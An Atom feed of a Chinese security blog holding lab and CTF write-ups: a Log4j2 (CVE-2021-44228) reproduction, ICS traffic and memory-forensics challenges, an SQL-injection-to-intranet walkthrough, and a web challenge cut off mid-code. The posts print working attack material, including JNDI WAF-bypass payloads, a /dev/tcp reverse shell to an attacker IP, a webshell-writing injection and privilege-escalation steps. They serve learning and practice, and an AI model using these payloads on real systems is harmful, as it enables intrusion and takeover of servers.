<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>北轨的博客</title>
  
  <subtitle>须知少时凌云志，曾许人间第一流</subtitle>
  <link href="http://www.beigui.xyz/atom.xml" rel="self"/>
  
  <link href="http://www.beigui.xyz/"/>
  <updated>2023-08-07T04:50:41.015Z</updated>
  <id>http://www.beigui.xyz/</id>
  
  <author>
    <name>北轨</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>log4j2漏洞复现(CVE-2021-44228)</title>
    <link href="http://www.beigui.xyz/2023/08/07/CVE-2021-44228/"/>
    <id>http://www.beigui.xyz/2023/08/07/CVE-2021-44228/</id>
    <published>2023-08-07T02:55:58.000Z</published>
    <updated>2023-08-07T04:50:41.015Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Apache-Log4j2"><a href="#Apache-Log4j2" class="headerlink" title="Apache Log4j2"></a>Apache Log4j2</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>​    Apache Log4j 2.x&lt;★Apache Shiro★&#x3D;2.14.1</p><h3 id="受影响的应用及组件"><a href="#受影响的应用及组件" class="headerlink" title="受影响的应用及组件"></a>受影响的应用及组件</h3><p>​    Spring-Boot-Strater-log4j2、Apache Solr、Apache Flink、Apache Druid</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Apache Log4j 是 Apache 的一个开源项目，Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。该日志框架被大量用于业务系统开发，用来记录日志信息。</p><h3 id="大概的执行逻辑"><a href="#大概的执行逻辑" class="headerlink" title="大概的执行逻辑"></a>大概的执行逻辑</h3><p>​    黑客在自己的客户端启动一个带有恶意代码的 rmi 服务，通过服务端的<br>log4j 的漏洞，向服务端的 jndi context lookup 的时候连接自己的 rmi 服务<br>器，服务端连接 rmi 服务器执行 lookup 的时候会通过 rmi 查询到该地址指<br>向的引用并且本地实例化这个类，所以在类中的构造方法或者静态代码块中<br>写入逻辑，就会在服务端（jndi rmi 过程中的客户端）实例化的时候执行到<br>这段逻辑，导致 jndi 注入。</p><h3 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://xxx.dnslog.cn/poc&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi://xxx.dnslog.cn/poc&#125;</span><br><span class="line">$&#123;jndi:rmi://xxx.dnslog.cn/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://xxx.dnslog.cn/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://xxx.dnslog.cn/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://xxx.dnslog.cn/poc&#125;</span><br></pre></td></tr></table></figure><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><p>靶场使用 ：vulhub中CVE-2021-44228容器</p><p>靶机IP：192.168.2.108</p><p>攻击机IP(kali)：192.168.2.110</p><h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><h4 id="开启环境"><a href="#开启环境" class="headerlink" title="开启环境"></a>开启环境</h4><p>启动docker环境后访问192.168.2.108:8983,成功访问证明环境启动成功</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20230807111635702.png" alt="image-20230807111635702"></p><h4 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><p>访问<a href="http://192.168.2.108:8983/solr/admin/cores?action=1%E8%BF%99%E4%B8%AA%E6%8E%A5%E5%8F%A3%EF%BC%8C%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%9C%A8%E8%BF%99%E4%B8%AA%E6%8E%A5%E5%8F%A3%EF%BC%8C%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8dnslog%E5%B9%B3%E5%8F%B0%EF%BC%8C%E6%9D%A5%E5%AF%B9%E6%AD%A4%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E9%AA%8C%E8%AF%81%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E5%88%99dnslog%E4%BC%9A%E6%88%90%E5%8A%9F%E5%9B%9E%E6%98%BEjava%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF%EF%BC%8C%E6%9E%84%E9%80%A0poc%E5%A6%82%E4%B8%8B%EF%BC%9A">http://192.168.2.108:8983/solr/admin/cores?action=1这个接口，漏洞点在这个接口，我们使用dnslog平台，来对此漏洞进行验证，如果存在漏洞则dnslog会成功回显java版本信息，构造poc如下：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.108:8983/solr/admin/cores？action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.hbpbem.dnslog.cn&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20230807112530449.png" alt="image-20230807112530449"></p><p>成功验证java版本，存在漏洞，进行漏洞攻击获取shell</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里使用JNDI注入工具，在攻击机中使用，构造反弹shell的paylod</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.2.110/6969 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>将payload进行bash64编码，构造工具使用语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c &quot; &#123;echo,YmFzaCAtaSA+IC9kZXYvdGNwLzE5Mi4xNjguMi4xMTAvNjk2OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 192.168.2.110</span><br></pre></td></tr></table></figure><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20230807114024362.png" alt="image-20230807114024362"></p><p>根据我们之前获取的java版本，可以得知我们此处应该使用JDK1,.8的注入语句，于是我们访问</p><p><a href="http://192.168.2.108:8983/solr/admin/cores?action=$%7Bjndi:rmi://192.168.2.110:1099/vlr3fx%7D">http://192.168.2.108:8983/solr/admin/cores?action=${jndi:rmi://192.168.2.110:1099/vlr3fx}</a></p><p>并在攻击机中使用nc监听6969端口获取shell（监听端口为payload中设置端口）</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20230807114733896.png" alt="image-20230807114733896"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、添加 jvm 启动参数-D log4j2.formatMsgNoLookups=true</span><br><span class="line">2、在应用 classpath 下添加 log4j2.component.properties 配置文件，文件内</span><br><span class="line">容为 1 中的指令。</span><br><span class="line">3、JDK 使用 11.0.1、8u191、7u201、6u211 及以上的高版本；</span><br><span class="line">4、部署使用第三方防火墙产品进行安全防护。</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Apache-Log4j2&quot;&gt;&lt;a href=&quot;#Apache-Log4j2&quot; class=&quot;headerlink&quot; title=&quot;Apache Log4j2&quot;&gt;&lt;/a&gt;Apache Log4j2&lt;/h2&gt;&lt;h3 id=&quot;影响范围&quot;&gt;&lt;a href=&quot;#影响范围&quot;</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://www.beigui.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>工控流量分析</title>
    <link href="http://www.beigui.xyz/2022/09/13/gongkongliuliang/"/>
    <id>http://www.beigui.xyz/2022/09/13/gongkongliuliang/</id>
    <published>2022-09-13T10:09:10.000Z</published>
    <updated>2022-09-17T09:16:49.499Z</updated>
    
    <content type="html"><![CDATA[<h3 id="异常的文件"><a href="#异常的文件" class="headerlink" title="异常的文件"></a>异常的文件</h3><blockquote><p>现存在一份被黑客攻击修改了的工程文件，请应急工作人员找出黑客攻击的痕迹，flag格式为：flag{}。</p></blockquote><p>下载得到压缩包，根据题目描述的提示我们可以得知，此题是需要我们对被修改后的文件，进行痕迹查找，通常在进行痕迹查找是我们用查找日志的方法比较多，这里我们理解出题的考点就是要在众多零碎的文件中找到，特定的痕迹(flag)。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220829214656108.png" alt="image-20220829214656108"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strings $(find | xargs) | grep flag</span><br><span class="line"><span class="comment">#“|”管道符，将标准输出流转换为标准输入流</span></span><br><span class="line"><span class="comment">#“xargs” 将是将标准输入转为命令行参数，一般搭配管道符“|”使用</span></span><br></pre></td></tr></table></figure><h3 id="简单的Modbus协议分析"><a href="#简单的Modbus协议分析" class="headerlink" title="简单的Modbus协议分析"></a>简单的Modbus协议分析</h3><blockquote><p>由于操作员操作不当导致化工车间蒸馏塔控制器程序出错，请分析错误程序查找错误点并获得flag，flag格式为flag{}。</p></blockquote><p>使用wireshark打开t3.pacp后过滤modbus协议，发现流量包中并未存在使用modbus进行流量传输，之后使用strings命令发现存在可疑16进制字符串，将16进制转ASCII得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">666c61677b44477377546667793147443233366673327366463264736b4c6e677d  十六进制</span><br><span class="line">flag&#123;DGswTfgy1GD236fs2sfF2dskLng&#125;                                   ASCII</span><br></pre></td></tr></table></figure><h3 id="Modbus协议分析"><a href="#Modbus协议分析" class="headerlink" title="Modbus协议分析"></a>Modbus协议分析</h3><blockquote><p>黑客通过外网进入一家工厂的控制网络，之后对工控网络中的操作员站系统进行了攻击，最终通过工控协议破坏了正常的业务。我们得到了操作员站在攻击前后的网络流量数据包，我们需要分析流量中的蛛丝马迹，找到FLAG。格式为flag{}</p></blockquote><p>看完上面那个简单题目后我们正式来一个modbus协议的题目，根据题目描述我们可以得知，我们要做的是将流量包中的恶意流量找出来，接下来我们详细讲讲</p><p>打开流量包后发现流量非常多，其中大比例是modbus协议流量，使用过滤器过滤出modbus协议流量。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220829221853387.png" alt="image-20220829221853387"></p><p>对modbus协议进行分析首先要对modbus的协议功能码记性分析，这里使用脚本分析协议功能码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_code</span>():</span><br><span class="line">     captures = pyshark.FileCapture(<span class="string">&quot;Modbus.pcap&quot;</span>)</span><br><span class="line">     func_codes = &#123;&#125;</span><br><span class="line">     <span class="keyword">for</span> c <span class="keyword">in</span> captures:</span><br><span class="line">         <span class="keyword">for</span> pkt <span class="keyword">in</span> c:</span><br><span class="line">             <span class="keyword">if</span> pkt.layer_name == <span class="string">&quot;modbus&quot;</span>:</span><br><span class="line">                 func_code = <span class="built_in">int</span>(pkt.func_code)</span><br><span class="line">                 <span class="keyword">if</span> func_code <span class="keyword">in</span> func_codes:</span><br><span class="line">                     func_codes[func_code] += <span class="number">1</span></span><br><span class="line">                 <span class="keyword">else</span>:</span><br><span class="line">                     func_codes[func_code] = <span class="number">1</span></span><br><span class="line">     <span class="built_in">print</span>(func_codes)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> get_code()</span><br></pre></td></tr></table></figure><p>脚本使用中出现报错情况，首先是查看是否安装pyshark这个模块，如果安装后报错找不到tshark.exe，<a href="https://blog.csdn.net/Dawn510/article/details/92799714">可以根据这篇文章进行修改</a></p><p>脚本运行结果，如图所示</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220829223420822.png" alt="image-20220829223420822"></p><p>根据<a href="https://wenku.baidu.com/view/8e6cc5f9b4daa58da1114a20.html">modbus常见功能码分析</a>，分析结果我们可以知道</p><p><code>1</code>（读取线圈状态）</p><p><code>2</code>（读取输入内容）</p><p><code>3</code>（读多个寄存器）</p><p><code>4</code>（读输入寄存器）</p><p>四个功能码都出现了702次，唯独16（预置多个寄存器）功能码只出现了两次，所以猜测与16功能码相关的流量可能存在关键数据，于是运行脚本分析与16功能码相关的流量，提取其中的数据，脚本和运行结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>():</span><br><span class="line">    cap = pyshark.FileCapture(<span class="string">&quot;modbus.pcap&quot;</span>) <span class="comment">#设置Modbus流量包路径</span></span><br><span class="line">    idx = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cap:</span><br><span class="line">        <span class="keyword">for</span> pkt <span class="keyword">in</span> c:</span><br><span class="line">            <span class="keyword">if</span> pkt.layer_name == <span class="string">&quot;modbus&quot;</span>:</span><br><span class="line">                func_code = <span class="built_in">int</span>(pkt.func_code)</span><br><span class="line">                <span class="keyword">if</span> func_code == <span class="number">16</span>: <span class="comment">#查看对应功能码寄存器下写入的值</span></span><br><span class="line">                    payload = <span class="built_in">str</span>(c[<span class="string">&quot;TCP&quot;</span>].payload).replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(hex_to_ascii(payload))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;&#123;0&#125; *&quot;</span>.<span class="built_in">format</span>(idx))</span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_ascii</span>(<span class="params">payload</span>):</span><br><span class="line">    data = payload</span><br><span class="line">    flags = []</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">        _<span class="built_in">ord</span> = <span class="built_in">ord</span>(d)</span><br><span class="line">        <span class="keyword">if</span> (_<span class="built_in">ord</span> &gt; <span class="number">0</span>) <span class="keyword">and</span> (_<span class="built_in">ord</span> &lt; <span class="number">128</span>):</span><br><span class="line">            flags.append(<span class="built_in">chr</span>(_<span class="built_in">ord</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(flags)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    find_flag()</span><br></pre></td></tr></table></figure><p>提出的数据存在一个16进制字符串<code>00000000003901100001001932005400680065004d006f006400620075007300500072006f0074006f0063006f006c0049007300460075006e006e00790021</code>，将16进制字符串在线转换对应的ASCII码，得到<code>TheModbusProtocolIsFunny!</code>，提交成功，Flag为<code>TheModbusProtocolIsFunny!</code>。</p><h3 id="S7协议恶意攻击分析"><a href="#S7协议恶意攻击分析" class="headerlink" title="S7协议恶意攻击分析"></a>S7协议恶意攻击分析</h3><blockquote><p>某天在硫化车间脱硫工艺所使用的的西门子PLC突然发生停机事件，经工厂人员调查发现该时间段PLC存在多次异常行为，请协助调查人员找出PLC相关行为，flag为异常行为数据包的前四位加后四位，格式为flag{}。</p></blockquote><p>使用wireshark过滤S7comm协议的数据包发现存在一处发现plc的stop包，经尝试为flag</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220830131827495.png" alt="image-20220830131827495"></p><h3 id="内存取证分析"><a href="#内存取证分析" class="headerlink" title="内存取证分析"></a>内存取证分析</h3><blockquote><p>某工厂遭到黑客攻击，但黑客留下了攻击痕迹，系统管理人员将内存保存了下来请应急人员分析注：提示请分析主机账号密码，flag格式化为flag{}。</p></blockquote><p>使用vol内存取证软件对镜像进行分析，根据题目描述的提示我们需要对镜像取证从而得到主机账号密码，提交flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ../ADMIN-PC-20201213-080024.raw imageinfo </span><br><span class="line"><span class="comment">#获取系统镜像版本</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220830171051129.png" alt="image-20220830171051129"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ../ADMIN-PC-20201213-080024.raw --profile=Win7SP1x64 hashdump</span><br><span class="line"><span class="comment">#使用hashdump插件获取账号密码的hash值</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220830171430165.png" alt="image-20220830171430165"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;异常的文件&quot;&gt;&lt;a href=&quot;#异常的文件&quot; class=&quot;headerlink&quot; title=&quot;异常的文件&quot;&gt;&lt;/a&gt;异常的文件&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;现存在一份被黑客攻击修改了的工程文件，请应急工作人员找出黑客攻击的痕迹，flag格式为：f</summary>
      
    
    
    
    
    <category term="流量分析" scheme="http://www.beigui.xyz/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>通过sql注入拿下内网(封神台)</title>
    <link href="http://www.beigui.xyz/2022/08/24/neiwangshentou1/"/>
    <id>http://www.beigui.xyz/2022/08/24/neiwangshentou1/</id>
    <published>2022-08-24T13:24:11.000Z</published>
    <updated>2022-09-17T09:16:49.497Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前台界面sql注入"><a href="#前台界面sql注入" class="headerlink" title="前台界面sql注入"></a>前台界面sql注入</h2><p>进入界面是封神台的招牌猫舍，大家都知道这个界面存在sql注入，经过测试这个确实也存在sql注入，但这个靶场考察点是内网渗透所以重点并不在sql这边。</p><h2 id="通过sql注入拿到webshell"><a href="#通过sql注入拿到webshell" class="headerlink" title="通过sql注入拿到webshell"></a>通过sql注入拿到webshell</h2><p>使用sqlmap进行注入的到服务器系统及mysql路径信息,可以看到服务器为windows服务器，后端语言是PHP5，mysql路径为c:&#x2F;phpstudy&#x2F;mysql，根据mysql路径可以得出网站使用phpstudy做集成系统，推测网站主目录在c:&#x2F;phpstudy&#x2F;www目录下。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220824161134.png"></p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220824161134.png" alt="image-20220824161134239"></p><p>使用sql语句讲一句话木马写入网站当中，并命名为bg.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://afsgr16-b1ferw.aqlab.cn/?id=7  union select 1,&#x27;&lt;?php eval($_POST[123]) ?&gt;&#x27; into dumpfile &#x27;C:/phpStudy/www/bg1.php&#x27;</span><br></pre></td></tr></table></figure><p>使用蚁剑连接一句话木马,成功连接，并得到服务器的 系统版本为Windows Server 2008 R2</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220824191107.png" alt="image-20220824191107360"></p><p>使用模拟终端查看当前用户并查看其权限，可以看到用户并没有在Adminstrators组中并没有管理员权限，尝试提权并添加新用户进adminstrator组。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220824171302.png" alt="image-20220824171302718"></p><h2 id="windows权限提升"><a href="#windows权限提升" class="headerlink" title="windows权限提升"></a>windows权限提升</h2><p>通常进行提权有两种方式，一种是因为不同的服务组件的权限不同，例如网站目录的权限低，但数据库权限高，我们就可以利用数据库去完成我们想要进行的操作，还有一种方式是利用系统漏洞对系统进行提权。我们通过前期信息收集，已得知服务器为windows，所以我们这里尝试使用win的系统漏洞，对服务器进行提权。</p><p>通过systeminfo命令我们可以得到服务器所打的补丁，在通过<a href="https://i.hacking8.com/tiquan">提权辅助探测网</a>查询可以利用的漏洞，通过查询我们这里使用烂土豆这个工具进行提权。 </p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220824190759.png" alt="image-20220824190759108"></p><p>首先在github中将烂土豆下载到本地并通过蚁剑上传到服务器，执行命令添加新用户</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220824203000.png" alt="image-20220824203000122"></p><p>并将新用户beigui添加到administrators组中，获得管理员权限</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220824203152.png" alt="image-20220824203152763"></p><p>通过netstat命令可以看到服务器 开放3389端口，尝试使用beigui账户进行远程连接。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220824203603.png" alt="image-20220824203602997"></p><h2 id="通过reGeorg打入内网"><a href="#通过reGeorg打入内网" class="headerlink" title="通过reGeorg打入内网"></a>通过reGeorg打入内网</h2><p>我们得到的服务器只能知道他的内网IP地址，我们无法知道他的3389端口映射到外网的哪一个IP上，我们这里使用reGeorg进行反向代理 ，具体使用方法可以自行查找资料，通过webshell将php文件上传到服务器后，使用reGeorgSocksProxy.py进行监听。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220824210009.png" alt="image-20220824210009837"></p><p>将流量使用proxifier进行转发，使用beigui账号登录远程桌面</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220824211748.png" alt="image-20220824211748323"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前台界面sql注入&quot;&gt;&lt;a href=&quot;#前台界面sql注入&quot; class=&quot;headerlink&quot; title=&quot;前台界面sql注入&quot;&gt;&lt;/a&gt;前台界面sql注入&lt;/h2&gt;&lt;p&gt;进入界面是封神台的招牌猫舍，大家都知道这个界面存在sql注入，经过测试这个确实也存在</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://www.beigui.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>两道强网杯web题解</title>
    <link href="http://www.beigui.xyz/2022/08/02/qwb_wp/"/>
    <id>http://www.beigui.xyz/2022/08/02/qwb_wp/</id>
    <published>2022-08-02T06:30:58.000Z</published>
    <updated>2022-09-17T09:16:49.497Z</updated>
    
    <content type="html"><![CDATA[<p>​在博客上记录一下强网杯两道做出的web题目的详细解析，因为题目已经关闭，所以只能通过源码加解释的方法对题目进行解析，我会尽量解析的比较细致。</p><h2 id="rcefile"><a href="#rcefile" class="headerlink" title="rcefile"></a>rcefile</h2><p>首先打开页面为文件上传功能页面，根据比赛经验，此类题目通常会给你读取源码的方法，这里我们直接尝试<a href="http://www.zip,成功下载到源码/">www.zip,成功下载到源码</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$userfile</span> = <span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;userfile&quot;</span>]) ? [] : <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;userfile&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;/index.php&quot;</span>&gt;Index&lt;/a&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;/showfile.php&quot;</span>&gt;files&lt;/a&gt;</span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>可以看到这里使用了<strong>spl_autoload_register</strong>函数，通过查询可以知道此函数的特点为如果不指定处理用的函数，就会自动包含“类名.php”或“类名.inc” 的文件，并加载其中的“类名”类，根据这个特点我们又看到源码中将上传文件的所有文件都进行序列化存储到cookie中，这里我们可以想到一个思路就是将php文件或者inc文件上传，并构造以文件名为类名的类，替换cookie从而实现，执行webshell的方法，思路有了我们在回头看一下upload.php对于上传文件做出了哪些限制。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.inc.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">102400</span>) &#123;</span><br><span class="line">        <span class="variable">$typeArr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;/&quot;</span>, <span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>]);</span><br><span class="line">        <span class="variable">$imgType</span> = <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$typeArr</span>[<span class="number">0</span>]== <span class="string">&quot;image&quot;</span> | !<span class="title function_ invoke__">in_array</span>(<span class="variable">$typeArr</span>[<span class="number">1</span>], <span class="variable">$imgType</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;type error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$blackext</span> = [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>];</span><br><span class="line">        <span class="variable">$filearray</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="variable">$filearray</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span 